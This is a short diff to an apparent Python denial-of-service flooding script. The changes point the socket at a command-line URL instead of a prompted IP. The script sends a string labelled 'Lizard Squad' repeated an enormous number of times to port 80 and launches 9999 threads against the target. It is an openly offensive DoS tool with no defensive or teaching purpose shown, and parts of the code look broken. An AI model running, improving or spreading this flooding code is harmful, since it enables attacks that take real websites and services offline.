@@ -83,7 +83,7 @@ def httpcall(url):
 	bytes = random._urandom(1490)
 	try:
 		
-			s.connect((host,80))
+			s.connect((url,80))
 			s.send("Lizard Squad" * 109951162777600)
 	except socket.error as e:
 			#print e.code
@@ -114,10 +114,8 @@ else:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = raw_input("IP: ")
+		
+		
 		for i in range(9999):
 			t = HTTPThread()
 			t.start()
